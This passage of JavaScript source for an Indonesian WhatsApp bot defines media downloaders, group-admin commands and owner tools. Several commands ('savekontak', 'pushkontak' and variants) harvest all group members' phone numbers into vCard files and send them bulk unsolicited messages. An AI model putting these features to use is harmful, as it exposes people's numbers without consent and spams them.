await fs.unlinkSync(fotonya)
}
break
case "public": {
if (!isOwner) return m.reply(msg.owner)
Skyzo.public = true
m.reply("Berhasil mengganti mode bot menjadi *Public*")
}
break
case "self": {
if (!isOwner) return m.reply(msg.owner)
Skyzo.public = false
m.reply("Berhasil mengganti mode bot menjadi *Self*")
}
break
case "get": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply("linknya")
try {
var check = await fetchJson(text)
m.reply(JSON.stringify(check, null, 2))
} catch (e) {
return m.reply(e.toString())
}}
break
case "setteksjpm": {
if (!isOwner) return m.reply(msg.owner)
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./all/database/teksjpm.js", newteks.toString())
m.reply("Berhasil Mengganti Teks JPM ✅")
} else {
return m.reply(example("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*"))
}}
break
case "teksjpm": {
if (!isOwner) return m.reply(msg.owner)
m.reply(fs.readFileSync("./all/database/teksjpm.js").toString())
}
break
case "tiktokaudio": case "tiktokmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.includes("tiktok.com")) return m.reply("Link tautan tidak valid!")
m.reply(msg.wait)
await fetchJson(`https://aemt.me/download/tiktokdl?url=${text}`).then((res) => {
Skyzo.sendMessage(m.chat, {audio: {url: res.result.music}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch(e => m.reply(e.toString()))
}
break
case "mediafire": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
await api.mediafireDl(text).then((res) => {
if (res.filesize.includes("GB")) return m.reply("Gagal mendownload, ukuran file terlalu besar")
if (res.filesize.split("MB")[0] >= 100) return m.reply("Gagal mendownload, ukuran file terlalu besar")
if (res.url == "") return m.reply(mess.error)
Skyzo.sendMessage(m.chat, {document: {url: res.url}, fileName: res.filename, mimetype: "application/"+res.ext.toLowerCase(), caption: "Download Berhasil ✅"}, {quoted: m})
}).catch((e) => m.reply(e.toString()))
}
break
case "pinterest": case "pin": {
if (!text) return m.reply(example("tobrut"))
m.reply(msg.wait)
await pinterest(text).then((res) => {
if (res.length < 1) return m.reply("Error, Foto Tidak Ditemukan")
let jumlah = 5
if (res.length < jumlah) jumlah = res.length
for (let e = 0; e < jumlah; e++) {
Skyzo.sendMessage(m.chat, {image: {url: res[e]}}, {quoted: m})
}
}).catch(e => m.reply(e.toString()))
}
break
case "tiktok": case "tt": {
if (!text) return m.reply(example('linknya'))
if (!/tiktok.com/.test(text)) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`).then((res) => {
var num = 0
if (res.result.data.duration == 0) {
for (let i of res.result.data.images) {
Skyzo.sendMedia(m.chat, `${i}`, m, {caption: `*Tiktok Downloader ✅*`})
}
} else {
var cap = `*Tiktok Downloader Done ✅*`
Skyzo.sendMessage(m.chat, {video: {url: res.result.data.play}, mimetype: "video/mp4", caption: cap}, {quoted: m})
}
}).catch((err) => {
return m.reply(err.toString())
})
}
break
case "facebook": case "fb": case "fbdl": {
if (!text) return m.reply(example("linkvidionya"))
if (!/facebook.com/.test(text)) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
await fetchJson(`https://aemt.me/download/fbdown?url=${text}`).then((res) => {
if (!res.status) return m.reply(JSON.stringify(res, null, 2))
Skyzo.sendMessage(m.chat, {video: {url: `${res.result.url.isHdAvailable == true ? res.result.url.urls[0].hd : res.result.url.urls[0].sd}`}, mimetype: 'video/mp4', caption: `*Fbdl Downloader Done ✅*`}, {quoted: m})
}).catch(e => m.reply(e.toString()))
}
break
case "owner": {
Skyzo.sendContact(m.chat, [owner], "Telfon Atau Vc = Block", m)
}
break
case "antilink": {
if (!isGroup) return m.reply(msg.group)
if (!isOwner && !isAdmin) return m.reply(msg.owner)
if (!args[0]) return m.reply(example("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink.includes(m.chat)) return m.reply("*Antilink* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
if (antilink2.includes(m.chat)) {
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
}
antilink.push(m.chat)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
m.reply("Berhasil Menyalakan *Antilink* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink.includes(m.chat)) return m.reply("*Antilink* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
m.reply("Berhasil Mematikan *Antilink* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else {
return m.reply(example("on/off"))
}}
break
case "antilinkV2": case "antilinkv2": {
if (!isGroup) return m.reply(msg.group)
if (!isOwner && !isAdmin) return m.reply(msg.owner)
if (!args[0]) return m.reply(example("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink2.includes(m.chat)) return m.reply("*AntilinkV2* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
if (antilink.includes(m.chat)) {
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
}
antilink2.push(m.chat)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
m.reply("Berhasil Menyalakan *AntilinkV2* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink2.includes(m.chat)) return m.reply("*AntilinkV2* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
m.reply("Berhasil Mematikan *Antilink* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Inii")
} else {
return m.reply(example("on/off"))
}}
break
case "welcome": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (welcome) return m.reply("*Welcome* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = true
m.reply("Berhasil Menyalakan *Welcome ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!welcome) return m.reply("*Welcome* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = false
m.reply("Berhasil Mematikan *Welcome ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "autoread": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (autoread) return m.reply("*Autoread* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
autoread = true
m.reply("Berhasil Menyalakan *Autoread ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!autoread) return m.reply("*Autoread* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
autoread = false
m.reply("Berhasil Mematikan *Autoread ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "anticall": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (anticall) return m.reply("*Anticall* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
anticall = true
m.reply("Berhasil Menyalakan *Anticall ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!anticall) return m.reply("*Anticall* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
anticall = false
m.reply("Berhasil Mematikan *Anticall ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "setting": case "settingbot": case "option": case "statusbot": {
if (!isOwner) return m.reply(msg.owner)
var teks = `
*List Status Bot Settings :*

* Autoread : ${global.autoread ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}
* Anticall : ${global.anticall ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}
* Welcome : ${global.welcome ? "*Aktif ✅*" : "*Tidak Aktif ❌*"}

*Contoh Penggunaan :*
Ketik *.autoread* on/off`
m.reply(teks)
}
break
case "statusgc": {
if (!isGroup) return m.reply(msg.group)
if (!isOwner && !isAdmin) return m.reply(msg.admin)
var anti1 = "Aktif ✅"
var anti2 = "Aktif ✅"
if (!antilink2.includes(m.chat)) anti2 = "Tidak Aktif ❌"
if (!antilink.includes(m.chat)) anti1 = "Tidak Aktif ❌"
var teks = `
*List Status Grup Settings :*

* Antilink : *${anti1}*
* AntilinkV2 : *${anti2}*

*Contoh Penggunaan :*
Ketik *.antilink* on/off
`
m.reply(teks)
}
break
case "setppgc": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (/image/g.test(mime)) {
let media = await Skyzo.downloadAndSaveMediaMessage(qmsg)
await Skyzo.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
m.reply("Berhasil Mengganti *Profil* Grup")
} else return m.reply(example('dengan mengirim foto'))}
break
case "setnamegc": case "setnamagc": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!text) return m.reply(example('teksnya'))
const gcname = metadata.subject
await Skyzo.groupUpdateSubject(m.chat, text)
m.reply(`Berhasil Mengganti Nama Grup *${gcname}* Menjadi *${text}*`)
}
break
case "setdesc": case "setdesk": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!text) return m.reply(example('teksnya'))
await Skyzo.groupUpdateDescription(m.chat, text)
m.reply(`Berhasil Mengganti *Deskripsi* Grup`)
}
break
case "open": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
await Skyzo.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Anggota Dapat Mengirim Pesan")
}
break
case "close": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
await Skyzo.groupSettingUpdate(m.chat, 'announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Hanya Admin Yang Dapat Mengirim Pesan")
}
break
case "del": case "delete": {
if (isGroup) {
if (!isOwner && !isAdmin) return m.reply(msg.admin)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
Skyzo.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return m.reply(msg.adminbot)
Skyzo.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return m.reply(msg.owner)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
Skyzo.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case "demote": case "demote": {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Skyzo.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => m.reply(`Berhasil Memberhentikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "promote": case "promot": {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Skyzo.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => m.reply(`Berhasil Menjadikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "add": case "addmember": {
if (!isGroup) return m.reply(msg.group)
if (!args[0]) return m.reply(example("62838XXX"))
var teks = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var cek = await Skyzo.onWhatsApp(`${teks.split("@")[0]}`)
if (cek.length < 1) return m.reply("Nomor Tersebut Tidak Terdaftar Di WhatsApp")
if (!isBotAdmin || !groupMetadata.memberAddMode) return m.reply("Gagal Menambahkan Member, Karna Admin Tidak Mengizinkam Peserta Dapat Add Member")
var a = await Skyzo.groupParticipantsUpdate(m.chat, [teks], 'add')
if (a[0].status == 200) return m.reply(`Berhasil Menambahkan ${teks.split("@")[0]} Kedalam Grup Ini`)
if (a[0].status == 408) return m.reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
if (a[0].status == 409) return m.reply(`Dia Sudah Ada Di Dalam Grup Ini!`)
if (a[0].status == 403) return m.reply(`Gagal Menambahkan ${teks.split("@")[0]} Ke Dalam Grup Ini, Karna Target Tidak Mengizinkan Orang Lain Dapat Menambahkan Dirinya Ke Dalam Grup`)
}
break
case "kik": case "kick": {
if (!isGroup) return m.reply(msg.group)
if (!isBotAdmin) return m.reply(msg.adminbot)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Skyzo.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => Skyzo.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => m.reply(err.toString()))
} else return m.reply(example('nomornya/@tag'))}
break
case "hidetag": case "z": case "h": {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!m.quoted && !text) return m.reply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
Skyzo.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "tagall": case "tag": {
if (!isGroup) return m.reply(msg.group)
if (!isAdmin && !isOwner) return m.reply(msg.admin)
if (!text) return m.reply(example("Pesannya"))
var member = await groupMetadata.participants.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
Skyzo.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "owner": case "creator": {
Skyzo.sendContact(m.chat, [`${owner[0].split("@")[0]}`], "Developer Bot", m)
}
break
case "savekontak": {
if (!isOwner) return m.reply(msg.owner)
if (!isGroup) return m.reply(msg.group)
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await Skyzo.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "savekontak2": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text
var groupMetadataa
try {
groupMetadataa = await Skyzo.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await Skyzo.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak": {
if (!isOwner) return m.reply(msg.owner)
if (!isGroup) return m.reply(msg.group)
if (!text) return m.reply(example("pesannya"))
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await Skyzo.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await Skyzo.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak1": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await Skyzo.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await Skyzo.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await Skyzo.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "pushkontak2": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return m.reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return m.reply("Format Delay Tidak Valid")
if (!teks) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await Skyzo.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
await Skyzo.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await Skyzo.sendMessage(m.sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/database/contacts.vcf", "")
}}
break
case "idgc": {
if (!isOwner) return m.reply(msg.owner)
if (!isGroup) return m.reply(msg.group)
m.reply(`${m.chat}`)
}
break
case "listgc": case "cekid": case"listgrup": {
let gcall = Object.values(await Skyzo.groupFetchAllParticipating().catch(_=> null))
let listgc = `*｢ LIST ALL CHAT GRUP ｣*\n\n`
await gcall.forEach((u, i) => {
listgc += `*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
m.reply(listgc)
}
break
case "joingc": case "join": {
if (!isOwner) return m.reply(msg.owner)
if (!text && !m.quoted) return m.reply(example('linknya'))
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return m.reply("Link Tautan Tidak Valid!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await Skyzo.groupAcceptInvite(result).then(respon => m.reply("Berhasil Bergabung Ke Dalam Grup ✅")).catch(error => m.reply(error.toString()))
}
break
case "leave": case "leavegc": {
if (!isOwner) return m.reply(msg.owner)
if (!isGroup) return m.reply(msg.group)
await m.reply("Otw Abangkuhh🔥")
await sleep(3000)
await Skyzo.groupLeave(m.chat)
}
break
case "leavegc2": case "leave2": {
if (!isOwner) return m.reply(msg.owner)
let gcall = await Object.values(await Skyzo.groupFetchAllParticipating().catch(_=> null))
let num = []
let listgc = `*Contoh Cara Penggunaan :*\nKetik *${cmd}* Nomor Grupnya\n\n*List Semua Grup Chat :*\n\n`
await gcall.forEach((u, i) => {
num.push(i)
listgc += ` *Nomor Grup => ${i+1}*\n*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
if (!args[0]) {
m.reply(listgc)
} else if (args[0]) {
if (!num.includes(Number(args[0]) - 1)) return m.reply("Grup tidak ditemukan")
let leav = Number(args[0]) - 1
await m.reply(`Berhasil Keluar Dari Grup :\n*${gcall[leav].subject}*`)
await Skyzo.groupLeave(`${gcall[leav].id}`)
}}
break
case "scbot": case "sc": 
case "scriptbot": {
if (isOwner) {
m.reply("Memproses Mengambil Script Bot")
let a = getTime().split("T")[0]
let b = getTime().split("T")[1].split("+")[0]
var name = `${a}◦${b}`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Skyzo.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("*File Script Bot* berhasil dikirim ke private chat")
} else {
Skyzo.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: 1000000, requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: `_Script ini di Jual! Jika berminat silahkan hubungi owner dengan cara ketik .*owner*_\n\n*© ${namabot}*`, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}}
break
case "done": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("barang,harga\n\n*Contoh :* Panel Unlimited,2"))
if (!text.split(",")) return m.reply(example("barang,harga\n\n*Contoh :* Panel Unlimited,2"))
const [barang, harga] = text.split(",")
if (isNaN(harga)) return m.reply("Format Harga Tidak Valid")
var total = `${harga}000000`
var total2 = Number(`${harga}000`)
const teks = `*TRANSAKSI DONE BY ${namaowner} ✅*

*📦 Barang :* ${barang}
*💸 Nominal :* Rp${toRupiah(total2)}
*⏰ Waktu :* ${getTime().split("T")[0]}

_*Terimakasih Sudah Mempercayai & Menggunakan Jasa Saya 🥳*_`
 Skyzo.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: Number(total), requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: `${teks}`, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}
break
case "startjpm": {
if (!isOwner) return m.reply(msg.owner)
var teksnya = await fs.readFileSync("./all/database/teksjpm.js").toString()
if (teksnya.length < 1) return m.reply("Teks Jpm Tidak Ditemukan, Silahlan Isi/Edit Teks Jpm Didalam Folder all/database")
var teks = `${teksnya}`
let total = 0
